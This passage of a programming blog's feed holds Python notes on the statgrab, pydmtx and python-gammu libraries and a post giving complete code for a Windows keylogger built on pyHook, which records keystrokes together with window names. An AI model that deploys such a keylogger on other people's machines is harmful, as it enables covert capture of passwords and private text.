<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">statgrab</span> <span class="kn">as</span> <span class="nn">stg</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="ow">not</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_init</span><span class="p">():</span> <span class="c">#Initialise the monitor. You could not call any function if you didn&#39;t initialized monitoring.</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_cpu_percents</span><span class="p">()</span>
</span><span class='line'><span class="c"># !! The problem with the module is that the object returned is a Result class so there is two solution to exploit results:</span>
</span><span class='line'>
</span><span class='line'><span class="c">#----- First Solution -----</span>
</span><span class='line'><span class="c">#you loop trough items knowing in advance all the keys. ex:</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;kernel&#39;</span><span class="p">,</span><span class="s">&#39;iowait&#39;</span><span class="p">,</span><span class="s">&#39;idle&#39;</span><span class="p">,</span><span class="s">&#39;swap&#39;</span><span class="p">,</span><span class="s">&#39;nice&#39;</span><span class="p">,</span><span class="s">&#39;user&#39;</span><span class="p">):</span> <span class="c">#time_taken ..</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">k</span><span class="p">,</span><span class="s">&quot;: &quot;</span><span class="p">,</span><span class="n">res</span><span class="p">[</span><span class="n">k</span><span class="p">],</span><span class="s">&quot;%&quot;</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">kernel :  0.531929373741 %</span>
</span><span class='line'><span class="sd">iowait :  0.00408129952848 %</span>
</span><span class='line'><span class="sd">idle :  97.5757064819 %</span>
</span><span class='line'><span class="sd">swap :  0.0 %</span>
</span><span class='line'><span class="sd">nice :  0.0 %</span>
</span><span class='line'><span class="sd">user :  1.8923625946 %</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="c">#-----------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="c">#----- 2nd Solution ------</span>
</span><span class='line'><span class="c">#you can convert Result class to dictionnary</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">ast</span>
</span><span class='line'><span class="n">dic</span> <span class="o">=</span> <span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="ow">in</span> <span class="n">dic</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">k</span><span class="p">,</span><span class="s">&quot;: &quot;</span><span class="p">,</span><span class="n">v</span><span class="p">,</span><span class="s">&quot;%&quot;</span>
</span><span class='line'><span class="c">#--------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="c">#sg_get_disk_io_stats()</span>
</span><span class='line'><span class="k">for</span> <span class="n">disk</span> <span class="ow">in</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_disk_io_stats</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">disk</span><span class="p">[</span><span class="s">&#39;disk_name&#39;</span><span class="p">],</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Read: &quot;</span><span class="p">,</span><span class="n">disk</span><span class="p">[</span><span class="s">&#39;read_bytes&#39;</span><span class="p">]</span><span class="o">/</span><span class="mi">1000</span><span class="p">,</span><span class="s">&quot;KB</span><span class="se">\t\t</span><span class="s">Write: &quot;</span><span class="p">,</span><span class="n">disk</span><span class="p">[</span><span class="s">&#39;write_bytes&#39;</span><span class="p">]</span><span class="o">/</span><span class="mi">1000</span><span class="p">,</span><span class="s">&quot;KB&quot;</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">sda  Read:  814150 KB        Write:  1347350 KB</span>
</span><span class='line'><span class="sd">sdb  Read:  11636 KB     Write:  0 KB</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#sg_get_host_info()</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_host_info</span><span class="p">()</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="ow">in</span> <span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">k</span><span class="p">,</span><span class="s">&quot;: &quot;</span><span class="p">,</span><span class="n">v</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">uptime :  11135</span>
</span><span class='line'><span class="sd">os_name :  Linux</span>
</span><span class='line'><span class="sd">os_version :  #1 SMP Fri Apr 6 05:01:55 UTC 2012</span>
</span><span class='line'><span class="sd">hostname :  PC</span>
</span><span class='line'><span class="sd">platform :  x86_64</span>
</span><span class='line'><span class="sd">os_release :  3.1.0-2-amd64</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#sg_get_mem_stats()</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Memory (RAM)&quot;</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_mem_stats</span><span class="p">()</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="ow">in</span> <span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="o">/</span> <span class="mi">1000000</span><span class="p">,</span><span class="s">&quot;MB&quot;</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">total 8372 MB</span>
</span><span class='line'><span class="sd">cache 1769 MB</span>
</span><span class='line'><span class="sd">used 4549 MB</span>
</span><span class='line'><span class="sd">free 3822 MB</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="c">#This is exactly the same with sg_get_swap_stats() but not with cache attribute</span>
</span><span class='line'>
</span><span class='line'><span class="c">#sg_get_network_iface_stats()</span>
</span><span class='line'><span class="k">for</span> <span class="n">iface</span> <span class="ow">in</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_network_iface_stats</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">iface</span><span class="p">[</span><span class="s">&#39;interface_name&#39;</span><span class="p">]</span><span class="o">+</span><span class="s">&quot;:&quot;</span><span class="p">,</span> <span class="s">&quot;up&quot;</span> <span class="k">if</span> <span class="n">iface</span><span class="p">[</span><span class="s">&quot;up&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="s">&quot;down&quot;</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">lo: up</span>
</span><span class='line'><span class="sd">wlan0: up</span>
</span><span class='line'><span class="sd">eth0: up</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#sg_get_network_io_stats()</span>
</span><span class='line'><span class="k">for</span> <span class="n">iface</span> <span class="ow">in</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_network_io_stats</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">iface</span><span class="p">[</span><span class="s">&#39;interface_name&#39;</span><span class="p">]</span><span class="o">+</span><span class="s">&quot;: Input:&quot;</span><span class="p">,</span><span class="n">iface</span><span class="p">[</span><span class="s">&#39;ipackets&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">,</span><span class="s">&#39;Kb</span><span class="se">\t</span><span class="s">Output:&#39;</span><span class="p">,</span><span class="n">iface</span><span class="p">[</span><span class="s">&#39;opackets&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">,</span><span class="s">&quot;Kb&quot;</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">lo: Input: 0 Kb  Output: 0 Kb</span>
</span><span class='line'><span class="sd">wlan0: Input: 794 Kb Output: 554 Kb</span>
</span><span class='line'><span class="sd">eth0: Input: 0 Kb    Output: 0 Kb</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#sg_get_process_count()</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_process_count</span><span class="p">()</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="ow">in</span> <span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">zombie 0</span>
</span><span class='line'><span class="sd">running 2</span>
</span><span class='line'><span class="sd">total 175</span>
</span><span class='line'><span class="sd">stopped 1</span>
</span><span class='line'><span class="sd">sleeping 172</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c">#sg_get_process_stats()</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">stg</span><span class="o">.</span><span class="n">sg_get_process_stats</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Number Processes:&quot;</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;CPU</span><span class="se">\t</span><span class="s">UID</span><span class="se">\t</span><span class="s">GID</span><span class="se">\t</span><span class="s">PID</span><span class="se">\t</span><span class="s">Name&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
</span><span class='line'>  <span class="k">print</span> <span class="nb">round</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="s">&#39;cpu_percent&#39;</span><span class="p">],</span><span class="mi">2</span><span class="p">),</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">&quot;</span><span class="p">,</span><span class="n">p</span><span class="p">[</span><span class="s">&#39;uid&#39;</span><span class="p">],</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">&quot;</span><span class="p">,</span><span class="n">p</span><span class="p">[</span><span class="s">&#39;gid&#39;</span><span class="p">],</span><span class="s">&#39;</span><span class="se">\t</span><span class="s">&#39;</span><span class="p">,</span><span class="n">p</span><span class="p">[</span><span class="s">&#39;pid&#39;</span><span class="p">],</span><span class="s">&#39;</span><span class="se">\t</span><span class="s">&#39;</span><span class="p">,</span><span class="n">p</span><span class="p">[</span><span class="s">&#39;process_name&#39;</span><span class="p">]</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">CPU  UID     GID PID Name </span>
</span><span class='line'><span class="sd">0.01     0   0   1   init</span>
</span><span class='line'><span class="sd">0.0  0   0   2   kthreadd</span>
</span><span class='line'><span class="sd">0.0  0   0   3   ksoftirqd/0</span>
</span><span class='line'><span class="sd">0.0  0   0   6   migration/0</span>
</span><span class='line'><span class="sd">0.0  0   0   7   watchdog/0</span>
</span><span class='line'><span class="sd">0.0  0   0   8   migration/1</span>
</span><span class='line'><span class="sd">...</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pydmtx Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2012/04/23/pydmtx-memo/"/>
    <updated>2012-04-23T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/04/23/pydmtx-memo</id>
    <content type="html"><![CDATA[<p>pydmtx is a module that allow to decode and encode 2 Dimentional barcodes also known as Data Matrix barcodes(or just matrix barcode).</p>

<p>Note: pydmtx does not work for the matrix barcode system developped by google for Android (which can be recognized by the 3 black squares, in the corners of the barcode).</p>

<p>The module is articulated around the PIL python module for image processing, but as we will see youcan easily convert it to OpenCV image for instance.</p>

<h2>Decoding using PIL</h2>

<figure class='code'><figcaption><span>Decoding matrix using PIL </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="c">#Take the picture in argument but can come from anywhere else</span>
</span><span class='line'><span class="k">if</span> <span class="n">img</span><span class="o">.</span><span class="n">mode</span> <span class="o">!=</span> <span class="s">&#39;RGB&#39;</span><span class="p">:</span> <span class="c">#Not absolutely needed because images are used to be in RGB.</span>
</span><span class='line'><span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s">&#39;RGB&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">message</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">size</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">img</span><span class="o">.</span><span class="n">size</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">buffer</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">tostring</span><span class="p">()))</span>
</span><span class='line'><span class="k">print</span> <span class="n">message</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Decoding using OpenCV</h2>

<figure class='code'><figcaption><span>Decoding using OpenCV </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">cv2.cv</span> <span class="kn">as</span> <span class="nn">cv</span>
</span><span class='line'>
</span><span class='line'><span class="n">img</span> <span class="o">=</span> <span class="n">cv</span><span class="o">.</span><span class="n">LoadImage</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="c">#You can also convert it, if it is not in RGB</span>
</span><span class='line'>
</span><span class='line'><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">message</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">width</span><span class="p">,</span> <span class="n">img</span><span class="o">.</span><span class="n">height</span><span class="p">,</span> <span class="n">img</span><span class="o">.</span><span class="n">tostring</span><span class="p">())</span> <span class="c">#As you can see doesn&#39;t matter the kind of image used, because decode take an image formated in string</span>
</span><span class='line'><span class="k">print</span> <span class="n">message</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Encoding using PIL</h2>

<figure class='code'><figcaption><span>Encoding using PIL </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span>
</span><span class='line'><span class="n">dm</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;Hello World&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">im</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">image</span> <span class="c">#Return the image in PIL format</span>
</span><span class='line'><span class="n">dm</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">&quot;helloworld.jpg&quot;</span><span class="p">,</span><span class="s">&quot;jpeg&quot;</span><span class="p">)</span> <span class="c">#But you can directly save it to a file</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Encoding using OpenCV</h2>

<figure class='code'><figcaption><span>Encoding using OpenCV </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">cv2.cv</span> <span class="kn">as</span> <span class="nn">cv</span>
</span><span class='line'><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span>
</span><span class='line'><span class="n">dm</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;Hello World&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">im</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">image</span> <span class="c">#Retrieve the image in PIL format</span>
</span><span class='line'><span class="n">cv_im</span> <span class="o">=</span> <span class="n">cv</span><span class="o">.</span><span class="n">CreateImageHeader</span><span class="p">(</span><span class="n">im</span><span class="o">.</span><span class="n">size</span><span class="p">,</span> <span class="n">cv</span><span class="o">.</span><span class="n">IPL_DEPTH_8U</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="c">#Create the new image</span>
</span><span class='line'><span class="n">cv</span><span class="o">.</span><span class="n">SetData</span><span class="p">(</span><span class="n">cv_im</span><span class="p">,</span> <span class="n">im</span><span class="o">.</span><span class="n">tostring</span><span class="p">())</span> <span class="c"># Fill it with the pil image content</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Then you have an OpenCV image contained in cv_im</span>
</span><span class='line'><span class="n">cv</span><span class="o">.</span><span class="n">ShowImage</span><span class="p">(</span><span class="s">&quot;Image&quot;</span><span class="p">,</span><span class="n">cv_im</span><span class="p">)</span>
</span><span class='line'><span class="n">cv</span><span class="o">.</span><span class="n">WaitKey</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Smart Keylogger in Python (for Windows)]]></title>
    <link href="http://www.robindavid.fr/blog/2012/02/01/smart-keylogger-in-python-for-windows/"/>
    <updated>2012-02-01T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/02/01/smart-keylogger-in-python-for-windows</id>
    <content type="html"><![CDATA[Since I have discovered the pyHook module for Windows, I keeped in mind the idea to do a keylogger. I finally found the time to do it and I will show what I have done which is as small as efficient.

The mechanism is quite easy, pyHook once launched grab all input events, and you need aside something to grab this hooked events. So there is two way to grab them, the first use pygame and make and infinite loop on the pygame.event.pump() method, the second use the pythoncom module and call pythoncom.PumpMessages() which do itself an infinite loop waiting for events.

The code of the keylogger is :

[cc lang=&#8221;python&#8221; line_numbers=&#8221;true&#8221;]
import pyHook
import pygame # or import pythoncom
import sys

class Keylogger():
    def __init__(self):
        self.windowname = None
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.OnKeyboardEvent
        self.hm.HookKeyboard()
        
    def run(self):# initialize pygame and start the game loop
        pygame.init()
        while True:
            pygame.event.pump()
        #or pythoncom.PumpMessages()
            
    def OnKeyboardEvent(self, event):
        if event.WindowName != self.windowname:
            self.windowname = event.WindowName
            print (&#8220;\n\nWindow: [%s]&#8221; % self.windowname)
        if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
            sys.stdout.write(chr(event.Ascii))

if __name__ == "__main__":
    k = Keylogger()
    k.run()
[/cc]

&nbsp;

For a given event, availables attributes are :

[cc lang="python"]

'MessageName:',event.MessageName
'Message:',event.Message
'Time:',event.Time
'Window:',event.Window
'WindowName:',event.WindowName
'Ascii:', event.Ascii, chr(event.Ascii)
'Key:', event.Key
'KeyID:', event.KeyID
'ScanCode:', event.ScanCode
'Extended:', event.Extended
'Injected:', event.Injected
'Alt', event.Alt
'Transition', event.Transition

[/cc]

Sources for this project are available on <a href="https://github.com/RobinDavid/Python-programs/tree/master/keylogger">github</a>.
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[python-gammu Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2012/02/01/python-gammu-memo/"/>
    <updated>2012-02-01T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/02/01/python-gammu-memo</id>
    <content type="html"><![CDATA[<ul>
	<li>Import gammu module
<strong>import gammu</strong></li>
</ul>
&nbsp;
<ul>
	<li>Initiate connection to the phone using default file configuration &#8220;~/.gammurc&#8221;
<strong>sm = gammu.StateMachine()</strong>
<strong>sm.ReadConfig()</strong>
<strong>sm.Init()</strong></li>
</ul>
&nbsp;
<ul>
	<li>Send SMS
[cc lang=&#8221;python&#8221;]message = {
&#8216;Text&#8217;: &#8216;python-gammu testing message&#8217;,
&#8216;SMSC&#8217;: {&#8216;Location&#8217;: 1},
&#8216;Number&#8217;: &#8216;+420800123465&#8217;,
}
sm.SendSMS(message)
[/cc]</li>
</ul>
&nbsp;
<ul>
	<li>Give a call to the given phone number
<strong>sm.DialVoice(phone_number)</strong></li>&nbsp;
	<li>Main Exception from which all others exceptions heritate.
<strong>except gammu.GSMError:</strong>
<span style="color: #0000ff;">Note: To check all others exceptions</span> <a title="wammu exception" href="http://wammu.eu/docs/manual/python/exceptions.html" target="_blank">wammu.eu</a></li>
	<span style="color: #ff0000;">Important: Every methods can throw various exception, be careful to catch them at least with GSMError</span>
</ul>
&nbsp;
<ul>
	<li>Get Netowrk informations
<strong>sm.GetNetworkInfo()</strong></li>
</ul>
&nbsp;
<ul>
	<li>Get infos</li>
<ul>
	<li><strong>sm.GetManufacturer()</strong></li>
	<li><strong>sm.GetModel()</strong></li>
	<li><strong>sm.GetFirmware()</strong></li>
	<li><strong>sm.GetIMEI()</strong></li>
	<li><strong>sm.GetOriginalIMEI()</strong></li>
	<li><strong>sm.GetProductCode()</strong></li>
	<li><strong>sm.GetSIMIMSI()</strong></li>
	<li><strong>sm.GetSMSC()</strong></li>
	<li><strong>sm.GetHardware()</strong></li>
	<li><strong>sm.GetManufacturerMonth()</strong></li>
	<li><strong>sm.GetPPM()</strong> #language packs in the phone</li>
</ul>&nbsp;
	<li>SMS infos</li>
<ul>
	<li><strong>sm.GetSMSStatus()</strong> #Return number of SMS read/unread etc..</li>
	<li><strong>sm.GetSMSFolders()</strong> # Return folders as hash with attributes</li>
</ul>&nbsp;
	<li>Read SMS
<strong>sms = sm.GetNextSMS(Start = True, Folder=0)</strong></li>
	and then
<strong>sms = sm.GetNextSMS(Location = sms[&#8216;Location&#8217;], Folder=0)</strong>
	<span style="color: #0000ff;">Note: To get a specific sms</span>
<strong>sms = sm.GetSMS(Location = loc, Folder = 0)</strong>&nbsp;&nbsp;
	&nbsp;<li>Example: Loop through SMS:[cc lang=&#8221;python&#8221;]
def printSMS():
    start = True
    while 1:
        try :
            if start:
                sms = sm.GetNextSMS(Start = True, Folder=0)
                start = False
            else:sms = sm.GetSMS(Location = loc, Folder = 0)
                sms = sm.GetNextSMS(Location = sms[0][&#8216;Location&#8217;], Folder=0)#be careful sometimes Location is directly in the hash so you&#8217;ll have to remove the [0]
        except gammu.ERR_EMPTY:
            break
        print &#8220;Location:%s\t State:%s\t Folder:%s\t Text:%s&#8221; % (sms[0][&#8216;Location&#8217;],sms[0][&#8216;State&#8217;],sms[0][&#8216;Folder&#8217;],sms[0][&#8216;Text&#8217;])[/cc]</li>&nbsp;
	<li>Get contacts informations from PhoneBook
<strong>phoneBookStatus = sm.GetMemoryStatus(Type = &#8216;ME&#8217;)</strong> # from mobile memory
<span style="color: #0000ff;">Note: Availables types : &#8216;ME&#8217;, &#8216;SM&#8217;, &#8216;ON&#8217;, &#8216;DC&#8217;, &#8216;RC&#8217;, &#8216;MC&#8217;, &#8216;MT&#8217;, &#8216;FD&#8217;, &#8216;VM&#8217;</span></li>&nbsp;
	<li>Loop through contacts of phonebook
